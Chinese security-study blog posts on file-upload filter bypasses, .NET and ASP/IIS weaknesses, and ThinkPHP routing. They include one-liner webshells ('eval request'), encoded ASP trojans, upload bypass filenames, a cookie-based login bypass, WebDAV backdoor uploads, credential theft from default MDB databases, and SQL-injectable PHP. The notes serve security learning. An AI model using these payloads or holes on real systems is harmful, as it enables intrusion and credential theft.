class="string">&quot;https://www.baidu.com&quot;</span>;</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>以上这些方法都是可以直接放在body中进行插入</p><h2 id="各种语言上传解析"><a href="#各种语言上传解析" class="headerlink" title="各种语言上传解析"></a>各种语言上传解析</h2><p>php</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="keyword">echo</span><span class="string">&quot;hello world&quot;</span>;</span><br></pre></td></tr></table></figure><p>java</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">&lt;%</span><br><span class="line">out.println(<span class="string">&quot;Hello World&quot;</span>);</span><br><span class="line">%&gt;</span><br><span class="line"></span><br><span class="line">&lt;hi xmlns:hi=<span class="string">&quot;http://java.sun.com/JSP/Page&quot;</span>&gt;</span><br><span class="line">    &lt;hi:scriptlet&gt;</span><br><span class="line">        out.println(<span class="number">30</span>*<span class="number">30</span>);</span><br><span class="line">    &lt;/hi:scriptlet&gt;</span><br><span class="line">&lt;/hi&gt;</span><br></pre></td></tr></table></figure><p>net</p><figure class="highlight c#"><table><tr><td class="code"><pre><span class="line">&lt;%<span class="function">eval <span class="title">request</span>(<span class="params"><span class="string">&quot;pass&quot;</span></span>)%&gt;</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">&lt;% @ webhandler language</span>=<span class="string">&quot;C#&quot;</span> <span class="keyword">class</span>=<span class="string">&quot;AverageHandler&quot;</span> %&gt;</span><br><span class="line"><span class="keyword">using</span> System;</span><br><span class="line"><span class="keyword">using</span> System.Web;</span><br><span class="line"><span class="keyword">using</span> System.Diagnostics;</span><br><span class="line"><span class="keyword">using</span> System.IO;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title">AverageHandler</span> : <span class="title">IHttpHandler</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">public</span> <span class="built_in">bool</span> IsReusable</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">get</span> &#123; <span class="keyword">return</span> <span class="literal">true</span>; &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">ProcessRequest</span>(<span class="params">HttpContext ctx</span>)</span></span><br><span class="line">  &#123;</span><br><span class="line">    Uri url = <span class="keyword">new</span> Uri(HttpContext.Current.Request.Url.Scheme + <span class="string">&quot;://&quot;</span> +   HttpContext.Current.Request.Url.Authority + HttpContext.Current.Request.RawUrl);</span><br><span class="line">    <span class="built_in">string</span> action = HttpUtility.ParseQueryString(url.Query).Get(<span class="string">&quot;action&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (action == <span class="string">&quot;test&quot;</span>)&#123;</span><br><span class="line">      ctx.Response.Write(<span class="string">&quot;RCE TEST&quot;</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span> <span class="keyword">if</span>(action == <span class="string">&quot;kill&quot;</span> )&#123;</span><br><span class="line">   <span class="keyword">try</span></span><br><span class="line">  &#123;</span><br><span class="line">   File.Delete(System.Web.HttpContext.Current.Request.PhysicalApplicationPath + url.LocalPath);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">catch</span>(Exception error)</span><br><span class="line">  &#123;</span><br><span class="line">   ctx.Response.Write(error);</span><br><span class="line">  &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line"> &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="各种语言后缀名绕过"><a href="#各种语言后缀名绕过" class="headerlink" title="各种语言后缀名绕过"></a>各种语言后缀名绕过</h2><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/1713004762085-0db37d9f-6f6f-4a3e-ab50-1b17fe28b914.png" alt="image.png"></p><h2 id="WAF的绕过"><a href="#WAF的绕过" class="headerlink" title="WAF的绕过"></a>WAF的绕过</h2><h3 id="contnet-type绕过"><a href="#contnet-type绕过" class="headerlink" title="contnet-type绕过"></a>contnet-type绕过</h3><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/1713004806426-b36632e2-38f0-42ab-bb3d-b5f443a4d886.png" alt="image.png"></p><h3 id="空格绕过上传"><a href="#空格绕过上传" class="headerlink" title="空格绕过上传"></a>空格绕过上传</h3><figure class="highlight html"><table><tr><td class="code"><pre><span class="line">filename=&quot;.jsp &quot;  //末尾加入空格</span><br><span class="line"></span><br><span class="line">filename=&quot;.j</span><br><span class="line">s</span><br><span class="line">p </span><br><span class="line">&quot;</span><br><span class="line">//使用换行符</span><br></pre></td></tr></table></figure><h3 id="点绕过上传"><a href="#点绕过上传" class="headerlink" title="点绕过上传"></a>点绕过上传</h3><figure class="highlight html"><table><tr><td class="code"><pre><span class="line">filename=&quot;.jsp.&quot;</span><br></pre></td></tr></table></figure><p>原理在于会从最后一个点解析，认为最后一个<code>.</code>之后的东西为后缀名</p><h3 id="DATA绕过（适用于Windows）"><a href="#DATA绕过（适用于Windows）" class="headerlink" title="::$DATA绕过（适用于Windows）"></a>::$DATA绕过（适用于Windows）</h3><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240530091216304.png" alt="image-20240530091216304"></p><p>对NTFS格式下的一个文件而言，至少包含一个流，即data流，data流是文件的主流，默认的data流其stream name为空。默认一个文件如果被指定了流，而该流没有stream type的话会在存储时自动添加$DATA</p><p>如下，在<code>.php</code>后加上<code>::$DATA</code>，将数据包forward</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/73581a0d0fd67d559ca5c1381b63d198.png" alt="img"></p><p>发现文件被成功上传到服务器，且后缀名为<code>.php::$data</code>，但是由于Windows的特性，在磁盘中会忽略<code>::$data</code>并将文件新建</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/43aabe97c57e16176203cdd5fcda1fce.png" alt="img"></p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/02e829de23a5d4924e17f96841adeef5.png" alt="img"></p><h3 id="条件竞争漏洞"><a href="#条件竞争漏洞" class="headerlink" title="条件竞争漏洞"></a>条件竞争漏洞</h3><p>条件竞争漏洞是一种服务器端的漏洞，由于服务器端在处理不同用户的请求时是并发进行的，因此，如果并发处理不当或相关操作逻辑顺序设计的不合理时，将会导致此类问题的发生。</p><p>上传文件源代码里没有校验上传的文件，文件直接上传，上传成功后才进行判断：如果文件格式符合要求，则重命名，如果文件格式不符合要求，将文件删除。<br>  由于服务器并发处理(同时)多个请求，假如<code>a用户</code>上传了木马文件，由于代码执行需要时间，在此过程中<code>b用户</code>访问了<code>a用户</code>上传的文件，会有以下三种情况：<br>  1.访问时间点在上传成功之前，没有此文件。<br>  2.访问时间点在刚上传成功但还没有进行判断，该文件存在。<br>  3.访问时间点在判断之后，文件被删除，没有此文件。</p><p>具体案例参考如下：<a href="https://blog.csdn.net/weixin_45588247/article/details/118796606">【文件上传绕过】——条件竞争漏洞_条件竞争上传漏洞-CSDN博客</a></p><h3 id="畸形协议"><a href="#畸形协议" class="headerlink" title="畸形协议"></a>畸形协议</h3><p>畸形上传，就是另类上传，攻击者通过巧妙地命名来绕过网站的检测函数，其实就是非正常文件命名</p><p>文件名双引号去掉，改成单引号等等都是畸形协议</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/1713005203715-784a69bd-5c4b-45e3-a896-25d36232699b.png" alt="image.png"></p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/1713005596603-0e623832-9e84-4e4f-9ce9-d10f6c329436.png" alt="image.png"></p><h3 id="分块传输内容"><a href="#分块传输内容" class="headerlink" title="分块传输内容"></a>分块传输内容</h3><p>有相关的插件可以实现</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/1713005386513-af1c3e1f-ad3c-420e-9b7f-bd6a649c84e1.png" alt="image.png"></p><h3 id="传两个表单"><a href="#传两个表单" class="headerlink" title="传两个表单"></a>传两个表单</h3><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/1713005656867-ec097565-bee9-4bbd-a9de-8a495b62cfbc.png" alt="image.png"></p><h3 id="传两个文件名"><a href="#传两个文件名" class="headerlink" title="传两个文件名"></a>传两个文件名</h3><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/1713005748632-05264455-6889-4309-bae2-edc3771089b1.png" alt="image.png"></p><h3 id="文件名多个等号"><a href="#文件名多个等号" class="headerlink" title="文件名多个等号"></a>文件名多个等号</h3><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/1713005780154-74e47129-65aa-426a-a238-abffb2ef42ac.png" alt="image.png"></p><h3 id="参数名多个等号"><a href="#参数名多个等号" class="headerlink" title="参数名多个等号"></a>参数名多个等号</h3><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/1713005816433-6a3c90f3-9244-434c-bbdd-02d39ff83817.png" alt="image.png"></p><h3 id="boundary多个等号或者——"><a href="#boundary多个等号或者——" class="headerlink" title="boundary多个等号或者——"></a>boundary多个等号或者——</h3><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/1713005850427-720be358-83b6-4db4-a578-26a4a9707bdb.png" alt="image.png"></p><h3 id="随机数修改"><a href="#随机数修改" class="headerlink" title="随机数修改"></a>随机数修改</h3><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/1713005916488-0832d066-d496-4660-a00e-dcc36d6b0779.png" alt="image.png"></p><h3 id="Content-Disposition溢出"><a href="#Content-Disposition溢出" class="headerlink" title="Content-Disposition溢出"></a>Content-Disposition溢出</h3><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/1713006041434-aef32fd7-333f-4441-9522-03699722dbf0.png" alt="image.png"></p><h3 id="删除Content-Type"><a href="#删除Content-Type" class="headerlink" title="删除Content-Type"></a>删除Content-Type</h3><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/1713006116438-f75269ab-8e5d-4270-8578-683250a60c52.png" alt="img"></p><h3 id="文件名溢出"><a href="#文件名溢出" class="headerlink" title="文件名溢出"></a>文件名溢出</h3><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/1713006178693-b14f9d61-e2c5-47d8-81e0-5f268a67516f.png" alt="image.png"></p><h3 id="Accept-Encoding-修改"><a href="#Accept-Encoding-修改" class="headerlink" title="Accept-Encoding:修改"></a>Accept-Encoding:修改</h3><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/1713006428548-7844a6c1-3213-49a0-a803-e6b8bd5d2704.png" alt="img"></p>]]></content>
      
      
      <categories>
          
          <category> 漏洞挖掘 </category>
          
          <category> 文件上传 </category>
          
          <category> 学习笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 文件上传 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>WEB攻防-.NET项目</title>
      <link href="/post/737ec9f7.html"/>
      <url>/post/737ec9f7.html</url>
      
        <content type="html"><![CDATA[<h2 id="NET项目"><a href="#NET项目" class="headerlink" title=".NET项目"></a>.NET项目</h2><p>.NET是一个开源（MIT License）、免费、跨平台的开发平台框架，用于生成多种类型的应用程序。.NET 可以运行使用多种语言（C#、Visual Basic、F#）编写的程序，其中C#是最常用的语言。C#和JAVA很类似，是为了防止JAVA的垄断局面而孕育而生的</p><h2 id="DLL文件反编译"><a href="#DLL文件反编译" class="headerlink" title="DLL文件反编译"></a>DLL文件反编译</h2><p>DLL为动态连接库，又称“应用程序拓展”，是软件文件类型。在Windows中，许多应用程序并不是一个完整的可执行文件，它们被分割成一些相对独立的动态链接库，即DLL文件，放置于系统中。当我们执行某一个程序时，相应的DLL文件就会被调用。一个应用程序可使用多个DLL文件，一个DLL文件也可能被不同的应用程序使用，这样的DLL文件被称为共享DLL文件，在Windows上，一个软件中出现最多的就是DLL文件</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240529162445002.png" alt="image-20240529162445002"></p><p>DLL文件可以类比为JAVA的jar包，存放各类函数的实现过程，当程序需要调用函数时先载入DLL，然后取得函数地址，最后进行调用，使用DLL的好处是不需要在运行之初加载所有代码，只需要在某个函数的时候从DLL中取出即可</p><p>DLL的文件格式与视窗<a href="https://zh.wikipedia.org/wiki/EXE">EXE</a>文件一样——也就是说，等同于<a href="https://zh.wikipedia.org/wiki/32位">32位</a>视窗的<a href="https://zh.wikipedia.org/wiki/Portable_Executable">可移植执行文件</a>（PE）和<a href="https://zh.wikipedia.org/wiki/16位">16位</a>视窗的<a href="https://zh.wikipedia.org/w/index.php?title=New_Executable&amp;action=edit&amp;redlink=1">New Executable</a>（NE）。作为EXE格式，DLL可以包括源代码、数据和资源的多种组合（wiki百科）</p><p>其中，<code>bin</code>目录下的文件代表的是可执行文件，.net项目中的dll文件中的核心代码是一个实例化的过程</p><p><code>web.config</code>是网站的配置文件</p><p>dll反编译工具：<code>ILSpy</code>，直接将dll文件拖入工具中就可以实现反编译</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240529195237417.png" alt="image-20240529195237417"></p><p>aspx的核心代码被分装到dll文件中，具体哪个dll文件，可以看<code>inherits</code>参数</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/03fdd8c8d8bd6c6e1bcfe0c7068f22af.png" alt="03fdd8c8d8bd6c6e1bcfe0c7068f22af"></p><p>如图，我们就可以在HdhCms下的admin下的activity中去寻找</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240529195724061.png" alt="image-20240529195724061"></p><h2 id="Web-config信息泄露"><a href="#Web-config信息泄露" class="headerlink" title="Web.config信息泄露"></a>Web.config信息泄露</h2><p><code>web.config</code>中有一项<code>customErrors mode</code> 参数，该参数有<code>On</code>和<code>Off</code>两种状态</p><p><code>Off状态：</code>关闭就会爆默认错误，默认错误就会爆出一些中间件类型、文件路径等，造成一定的泄露</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/f4d3b59026eca92899d53cfb37b3d5ce.png" alt="f4d3b59026eca92899d53cfb37b3d5ce"></p><p><code>On状态：</code>开启将会由网站管理员定义如何报错，报什么错，可以报页面不存在或者404页面</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240529201621382.png" alt="image-20240529201621382"></p><h2 id="身份验证未授权登录"><a href="#身份验证未授权登录" class="headerlink" title="身份验证未授权登录"></a>身份验证未授权登录</h2><p><strong>未授权访问</strong>：后台需要登录才能访问，但是未登录就看到了后台的内容；普通用户可以访问会员用户的都算未授权访问</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">后端判断用户身份的方式：</span><br><span class="line">在每个文件中添加判断代码</span><br><span class="line">创建一个文件专门用来判断用户身份，其他文件包含调用该文件</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">如何利用未授权访问漏洞：</span><br><span class="line">找文件没有包含验证代码的文件</span><br><span class="line">验证代码文件是否可以绕过</span><br></pre></td></tr></table></figure><p>相关实例：</p><p>如果我们要绕过登录界面，首先要找到登录验证代码，我们可以通过反编译进行代码审计</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/5d079eda3e1711cf054e179c488988b7.png" alt="5d079eda3e1711cf054e179c488988b7"></p><p>首先这里有一个判断，如果<code>GetUserId &lt;= 0</code>，就跳转到<code>login</code>界面，否则进入主页面，所以我们的主要目标在<code>GetUserId</code>上，我们可以点击跳转到<code>GetUserId</code>上</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240529205942393.png" alt="image-20240529205942393"></p><p>从代码分析后可知，我们可以看到首先<code>userinfo</code>不能为空，倘如<code>uesrinfo</code>不为空，则返回<code>userinfo</code>下的<code>userid</code>的整数值，所以我们只需要在<code>Cookie</code>中加上<code>userid</code>即可</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/0ebeea254a6ea627c7d50bed0b458704.png" alt="0ebeea254a6ea627c7d50bed0b458704"></p><p><strong>发现可以成功绕过，存在未授权访问</strong></p>]]></content>
      
      
      <categories>
          
          <category> 网络攻防 </category>
          
          <category> WEB攻防 </category>
          
          <category> 笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> .NET </tag>
            
            <tag> DLL反编译 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>WEB攻防-ASP安全</title>
      <link href="/post/2f49a156.html"/>
      <url>/post/2f49a156.html</url>
      
        <content type="html"><![CDATA[<h2 id="ASP简介"><a href="#ASP简介" class="headerlink" title="ASP简介"></a>ASP简介</h2><p>ASP文件可包含文本、HTML标签和脚本。ASP文件中的脚本可以在服务器上执行。ASP即（<strong>A</strong>ctive <strong>S</strong>erver <strong>P</strong>ages），动态服务器页面，相对于PHP和JAVA，ASP搭建在Windows2003上，目前已经较为过时，使用ASP的网站也已经越来越少，所以这部分漏洞利用价值也不高，但是仍然需要有一定的了解</p><h2 id="ASP环境搭建组合"><a href="#ASP环境搭建组合" class="headerlink" title="ASP环境搭建组合"></a>ASP环境搭建组合</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">Windows操作系统</span><br><span class="line">IIS中间件</span><br><span class="line">Access数据库</span><br></pre></td></tr></table></figure><p>IIS全称是Internet Information Services（互联网信息服务），是微软提供的运行在Windows系统下的中间件，主要用来解析.asp，.asa，.cer三种格式的文件，实际环境中.asp一般都是被过滤的，所以有时候尝试一下asa和cer两种格式上传即可</p><h3 id="什么是文件解析？"><a href="#什么是文件解析？" class="headerlink" title="什么是文件解析？"></a>什么是文件解析？</h3><p>当服务器接收到一个HTTP请求时，IIS（中间件）首先要决定如何去处理这个请求（一般都是根据文件后缀名，如果是PHP就丢给PHP程序去处理，如果是ASP就丢给IIS去处理），服务器获取所有请求页面的后缀名后，会在服务器端寻找可以处理这类后缀名的应用程序，如果找不到就直接把这个文件返回给客户端</p><h3 id="版本对应"><a href="#版本对应" class="headerlink" title="版本对应"></a>版本对应</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">Windows <span class="number">2003</span> server -------&gt;IIS <span class="number">6.0</span></span><br><span class="line">Windows <span class="number">7</span> -------&gt;IIS <span class="number">7.0</span>和IIS <span class="number">7.5</span></span><br><span class="line">Windows <span class="number">2008</span> server sp2 -------&gt; IIS <span class="number">7.0</span></span><br><span class="line">Windows <span class="number">2008</span> server R2--------&gt;IIS <span class="number">7.5</span></span><br><span class="line">xp和<span class="number">2000</span> server对应的IIS <span class="number">5.0</span></span><br></pre></td></tr></table></figure><h3 id="IIS6-0解析漏洞"><a href="#IIS6-0解析漏洞" class="headerlink" title="IIS6.0解析漏洞"></a>IIS6.0解析漏洞</h3><p>第一种是在浏览器下建立一个名为xxx.asp的目录，6.0默认在.asp下的文件都以ASP文件来解析，例如/test.asp/1.gif会被当作ASP解析</p><p>第二种利用分号这个符号，例如test.asp;.jpg本质上是jpg文件，但是在6.0中由于分号的作用会被当成asp程序执行，这应该也是为什么Windows禁止命名时里面有特殊字符</p><h3 id="IIS7-5解析漏洞"><a href="#IIS7-5解析漏洞" class="headerlink" title="IIS7.5解析漏洞"></a>IIS7.5解析漏洞</h3><p>如果PHP默认开启cgi.fix_pathinfo的话，会对文件路径进行修理，什么是修理？就是当PHP遇到文件路径/aaa.xxx/bbb.yyy时，若/aaa.xxx/bbb.yyy不存在，则会去掉最后的bbb.yyy。然后去判断/aaa.xxx是否存在，如果存在，则把/aaa.xxx当作文件去解析，如果有文件test.jpg，在访问时在其后加了/.php，便可以让IIS把test.jpg/.php交给PHP去处理，由于test.jpg/.php这个路径是肯定不存在的，于是进行修理，得到test.jpg，这个文件是存在的，于是就把这个文件交给PHP去处理解析，如果是个恶意代码就会产生一些破坏，CTF里面有时候会遇到这些题，日常中应该用的还比较少</p><h2 id="MDB默认下载"><a href="#MDB默认下载" class="headerlink" title="MDB默认下载"></a>MDB默认下载</h2><p>因为asp一般将数据库文件放在网站根目录下，如果我们知道数据库的地址，我们可以尝试下载获取数据库文件，获取当前管理员账号密码信息（asp的默认数据库后缀为mdb）</p><p>思路：首先先尝试获取数据库文件位置，可以尝试默认数据库配置（即本地搭建后默认存放的数据库文件与其他文件位置）或者使用扫描工具</p><p>IIS6.0把asp、asa、cdx、cer解析成asp文件，原因是这四种扩展名都是用的同一个asp.dll文件执行，而对于mdb文件，ISS不能解析MDB文件，会当成普通文件进行下载，也就达到了我们绕过的目的</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/80a1e6ff69fa49e5bc0ee804af18240c.png" alt="在这里插入图片描述"></p><p>以动易网络cms为例，若使用动易网络cms的网站不修改默认数据库及其他文件路径可通过默认路径得到数据库文件进而得到网站管理员账号密码，对于网站管理员后台也可采用同样的思路</p><p>首先输入mdb文件所在的文件夹位置，访问后自动下载</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240528172132368.png" alt="image-20240528172132368"></p><p>打开后，我们可以看见管理员账户密码</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240528172252411.png" alt="image-20240528172252411"></p><p>之后访问<code>http://192.168.49.146/Admin/Admin_Login.asp</code>进行后台登录，输入管理员账号密码</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240528172406156.png" alt="image-20240528172406156"></p><h2 id="ASP后门植入"><a href="#ASP后门植入" class="headerlink" title="ASP后门植入"></a>ASP后门植入</h2><p>数据库后缀为asp，访问之后并不会直接下载，而是会产生一段乱码</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240528172720302.png" alt="image-20240528172720302"></p><p>但是由于是asp后缀，当我们插入恶意代码时，系统会帮我们进行执行，如果对留言板传入数据处理不当，我们就可以进行代码注入，可以将一句话木马插入数据库，进而getshell</p><p>以aspcms为例，一句话木马为<code>┼攠數畣整爠煥敵瑳∨≡┩愾</code></p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240528173448671.png" alt="image-20240528173448671"></p><p>之后用菜刀或者antsword进行连接，就可以看到源代码</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240528173535188.png" alt="image-20240528173535188"></p><h2 id="IIS短文件名探针"><a href="#IIS短文件名探针" class="headerlink" title="IIS短文件名探针"></a>IIS短文件名探针</h2><p>为了知道相应的路径，我们可以使用探针工具进行爆破，其原理如下</p><p>为了兼容16位MS-DOS程序，Windows为文件名较长的文件和文件夹生成了对应的Windows8.3短文件名</p><p>由于短文件名的长度固定，我们可以直接对短文件名进行暴力破解，从而访问对应的文件</p><p>短文件名特征</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span>)  只有前六位字符直接显示，后续字符用~<span class="number">1</span>指代。其中数字<span class="number">1</span>还可以递增，如果存在多个文件名类似的文件（名称前<span class="number">6</span>位必须相同，且后缀名前<span class="number">3</span>位必须相同）</span><br><span class="line"><span class="number">2</span>)  后缀名最长只有<span class="number">3</span>位，多余的被截断</span><br><span class="line"><span class="number">3</span>)  访问构造的某个存在的短文件名，会返回<span class="number">404</span></span><br><span class="line"><span class="number">4</span>)  访问构造的某个不存在的短文件名，会返回<span class="number">400</span></span><br></pre></td></tr></table></figure><p>我们可以使用探针工具，比如<code>iis_shortname_Scan.py</code>进行扫描，如下图所示</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240528184812313.png" alt="image-20240528184812313"></p><h2 id="IIS配置目录读写"><a href="#IIS配置目录读写" class="headerlink" title="IIS配置目录读写"></a>IIS配置目录读写</h2><p>当web服务器中开启了WebDAV，配置了可以写入的权限，存在PUT任意文件写入漏洞</p><p><strong>利用方法：桂林老兵iiswrite，用PUT/MOVE之类的请求方式往服务器传后门文件，然后改文件名使用菜刀连接</strong></p><p>以本地搭建的web网站为例：</p><p>首先开启WebDAV的写入权限，使用iisputscanner扫描</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240528185754738.png" alt="image-20240528185754738"></p><p>出现YES则代表开启了相关服务，之后使用桂林老兵进行上传，首先上传一个txt文件，上传之后重命名为asp文件</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240528190043428.png" alt="image-20240528190043428"></p><p>test.txt无法被iis解析，利用MOVE将txt的文件修改为可解析执行的asp，但是上传失败，我们利用文件解析漏洞再次上传，我们将文件后缀名改成<code>shell.asp;.txt</code>，上传的虽然是txt文件，但是会被当成asp文件进行执行</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240528195603715.png" alt="image-20240528195603715"></p><p>然后使用菜刀连接，就可以getshell</p>]]></content>
      
      
      <categories>
          
          <category> 网络攻防 </category>
          
          <category> WEB攻防 </category>
          
          <category> 笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ASP </tag>
            
            <tag> MDB下载 </tag>
            
            <tag> IIS短文件 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PHP开发-ThinkPHP框架及历史漏洞</title>
      <link href="/post/b689c3c5.html"/>
      <url>/post/b689c3c5.html</url>
      
        <content type="html"><![CDATA[<h2 id="框架概述"><a href="#框架概述" class="headerlink" title="框架概述"></a>框架概述</h2><p>其实框架，就是别人写好的包装起来的一套工具，把你原来必须要写的，必须要做的东西写好了放在那里，你只需要调用他给定的方法来实现相应的功能，很方便开发者进行相关的开发</p><p>WEB开发的MVC模式，其中M是模型，V是视图（表现层），C是控制层，框架就是M层，把一个不涉及业务相关的东西都写好了包装起来，我们使用就可以了，框架其实就是把很多复杂的东西都弄好了，我们只需要在里面加上具有我们独有的东西就可以了</p><p>框架的设计出来的目的是为了省略掉一些基本的相同底层代码的反复书写，只需调用框架的方法就可以实现我们想要的功能</p><p>我们常见的框架就是TP框架，下面都拿TP框架进行举例学习</p><h2 id="基于TP框架的CMS"><a href="#基于TP框架的CMS" class="headerlink" title="基于TP框架的CMS"></a>基于TP框架的CMS</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">AdminLTE后台管理系统</span><br><span class="line">layui后台管理系统</span><br><span class="line">thinkcmf</span><br><span class="line">H-ui.admin后台管理系统</span><br><span class="line">tpshop</span><br><span class="line">FsatAdmin</span><br><span class="line">eyoucms</span><br><span class="line">LarryCMS后台管理系统</span><br><span class="line">tpadmin后台管理系统</span><br><span class="line">snake后台管理系统</span><br><span class="line">ThinkSNS</span><br><span class="line">DolphinPHP后台管理系统</span><br><span class="line">WeMall商城系统</span><br><span class="line">CLTPHP</span><br><span class="line">齐博CMS</span><br><span class="line">DSMALL</span><br><span class="line">YFCMF</span><br><span class="line">HisiPHP后台管理系统</span><br><span class="line">Tplay后台管理系统</span><br><span class="line">lyadmin后台管理系统</span><br><span class="line">haoid后台管理系统</span><br></pre></td></tr></table></figure><p>以上这些是常见的以TP框架开发的CMS，有个了解就行</p><h2 id="TP路径访问"><a href="#TP路径访问" class="headerlink" title="TP路径访问"></a>TP路径访问</h2><p>TP框架也是支持MVC的，即基于模型、视图、控制器的设计模式，如下图所示</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/56b6b91d0d49ad84ce325362ea457e88.png" alt="56b6b91d0d49ad84ce325362ea457e88"></p><p>我们如果要访问对应的方法，我们必须以如下方式进行</p><p><code>/index(文件夹)/index(控制器)/xxx(方法)</code>，如下图所示</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/186cacd8cd71f93436151562fb38f85d.png" alt="186cacd8cd71f93436151562fb38f85d"></p><p>从中我们也可以受到相应的启发，我们可以从路径中发现他的控制器，以及类名，当拿到源码的时候，也不至于胡乱寻找，同时，使用这种方式的网站也有很多，我们可以使用<code>inurl:index.php/index</code>进行关键字查询，如下就是一个典型的使用MVC方式的网站，控制器为Index，类为news_detail，方法为3306</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240527181351909.png" alt="image-20240527181351909"></p><p>当方法里面有参数的时候，我们有两种方式进行书写</p><p>当代码接受参数使用<code>$_GET</code>的时候，我们必须使用<code>/index/index/xxx?x=1</code>的写法</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240527181011513.png" alt="image-20240527181011513"></p><p>但是当接受参数使用的是<code>input</code>函数时，我们也可以使用<code>/index/index/xxx/x/1</code>的方式进行传参</p><p><img src="https://raw.githubusercontent.com/ikun123234/image_repo/main/image/image-20240527181232549.png" alt="image-20240527181232549"></p><h2 id="TP写法区别"><a href="#TP写法区别" class="headerlink" title="TP写法区别"></a>TP写法区别</h2><p>首先。我们先使用TP框架进行数据库的查询，下面是相关的代码</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">sqlin</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="variable">$id</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;x&#x27;</span>];</span><br><span class="line">    <span class="variable">$coon</span> = <span class="title function_ invoke__">mysql_connect</span>(<span class="string">&#x27;localhost&#x27;</span>,<span class="string">&#x27;root&#x27;</span>,<span class="string">&#x27;root&#x27;</span>);</span><br><span class="line">    <span class="title function_ invoke__">mysql_select_db</span>(<span class="string">&#x27;syguestbook&#x27;</span>);</span><br><span class="line">    <span class="variable">$sql</span> = <span class="string">&quot;select * from sy_message where id = <span class="subst">$id</span>&quot;</span>;</span><br><span class="line">    <span class="variable">$result</span> = (row = <span class="title function_ invoke__">mysql_fetch_array</span>(<span class="variable">$result</span>))&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$row</span>[<span 